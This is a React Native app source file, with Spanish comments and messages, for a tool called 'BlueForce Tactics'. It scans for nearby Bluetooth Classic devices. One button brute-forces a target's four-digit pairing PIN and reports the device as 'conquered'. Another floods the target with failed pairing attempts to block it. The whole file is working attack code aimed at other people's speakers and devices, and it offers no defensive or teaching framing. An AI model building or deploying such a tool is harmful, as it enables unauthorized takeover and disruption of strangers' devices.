import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

const SignalMeter = ({ rssi }) => {
  let strength = 0;
  if (rssi > -45) strength = 5;
  else if (rssi > -60) strength = 4;
  else if (rssi > -75) strength = 3;
  else if (rssi > -85) strength = 2;
  else if (rssi > -100) strength = 1;
  const getColor = () => strength >= 4 ? '#00ff88' : strength === 3 ? '#ffea00' : '#ff3c00';
  return (
    <View style={styles.meterContainer}>
      {[1, 2, 3, 4, 5].map(b => (
        <View key={b} style={[styles.bar, { height: b * 3, backgroundColor: b <= strength ? getColor() : '#222' }]} />
      ))}
    </View>
  );
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [isScanning, setIsScanning] = useState(false);
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        ]);
      }
    })();
  }, []);

  const updateHistory = (mac, status, pin = null) => {
    setHistory(prev => ({ ...prev, [mac]: { status, pin } }));
  };

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a, b) => b.rssi - a.rssi));
      addLog("✅ Escaneo táctico completo.");
    } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setMode('BRUTE');
    updateHistory(device.address, '⚔️ PROBANDO');
    
    for (let i = 0; i <= 9999; i++) {
      let m; setMode(cur => { m = cur; return cur; });
      if (m !== 'BRUTE') break;

      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      
      try {
        // Intentar vincular enviando el PIN
        await RNBluetoothClassic.pairDevice(device.address, { pin });
        
        // VERIFICACIÓN CRUCIAL: ¿Realmente se vinculó?
        // Esperamos un instante para que el sistema actualice el estado
        await new Promise(r => setTimeout(r, 1500));
        
        const bonded = await RNBluetoothClassic.getBondedDevices();
        const isActuallyBonded = bonded.some(d => d.address === device.address);

        if (isActuallyBonded) {
          addLog(`🎯 VÍNCULO REAL CONFIRMADO: ${pin}`);
          updateHistory(device.address, '🔓 CONQUISTADO', pin);
          setMode('IDLE');
          Alert.alert("¡VÍNCULO EXITOSO!", `El parlante ahora es tu esclavo. PIN: ${pin}`);
          return;
        } else {
          addLog(`❌ PIN ${pin} rechazado por el hardware.`);
        }
      } catch (e) {
        // Fallo normal del Bluetooth
        await new Promise(r => setTimeout(r, 800));
      }
    }
    setMode('IDLE');
  };

  const startJammer = async (device) => {
    setMode('JAMMER');
    updateHistory(device.address, '🚫 BLOQUEADO');
    while (true) {
      let m; setMode(cur => { m = cur; return cur; });
      if (m !== 'JAMMER') break;
      try { await RNBluetoothClassic.pairDevice(device.address, { pin: '0' }); } catch (e) {}
    }
  };

  const renderItem = ({ item }) => {
    const h = history[item.address] || { status: '⚪ NUEVO' };
    const isConquered = h.status.includes('🔓');
    const isAnyActive = mode !== 'IDLE';

    return (
      <View style={styles.card}>
        <SignalMeter rssi={item.rssi} />
        <View style={{ flex: 1, marginLeft: 15 }}>
          <Text style={styles.name}>{item.name || item.address}</Text>
          <Text style={styles.mac}>{item.address}</Text>
          <Text style={[styles.historyText, { color: isConquered ? '#00ff88' : '#888' }]}>{h.status}</Text>
        </View>
        <View style={{ flexDirection: 'row' }}>
          {isConquered ? (
            <TouchableOpacity style={[styles.btnA, { backgroundColor: '#00f2ff' }]} onPress={() => RNBluetoothClassic.connectDevice(item.address)}>
              <Text style={[styles.btnText, { color: '#000' }]}>AUD</Text>
            </TouchableOpacity>
          ) : (
            <>
              <TouchableOpacity style={styles.btnA} onPress={() => startBruteForce(item)} disabled={isAnyActive}>
                <Text style={styles.btnText}>PIN</Text>
              </TouchableOpacity>
              <TouchableOpacity style={[styles.btnA, { backgroundColor: '#ff0055', marginLeft: 5 }]} onPress={() => startJammer(item)} disabled={isAnyActive}>
                <Text style={styles.btnText}>BLOCK</Text>
              </TouchableOpacity>
            </>
          )}
        </View>
      </View>
    );
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Tactics</Text>
      <View style={styles.main}>
        <Text style={styles.pin}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#fff" /> : <Text style={styles.scanText}>ESCANEAR AREA</Text>}
        </TouchableOpacity>
      </View>
      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} style={{ flex: 1 }} />
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.stopText}>ABORTAR</Text></TouchableOpacity>}
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.logText}>{l}</Text>)}</ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  header: { marginBottom: 20 },
  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold' },
  main: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 15 },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold' },
  card: { backgroundColor: '#181818', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
  mac: { color: '#555', fontSize: 9 },
  historyText: { fontSize: 8, marginTop: 4, fontWeight: 'bold' },
  meterContainer: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  bar: { width: 3, marginRight: 2, borderRadius: 1 },
  btnA: { backgroundColor: '#222', paddingVertical: 8, paddingHorizontal: 12, borderRadius: 8 },
  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  stop: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 15 },
  stopText: { color: '#fff', fontWeight: 'bold' },
  logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  logText: { color: '#444', fontSize: 9, marginBottom: 2 }
});
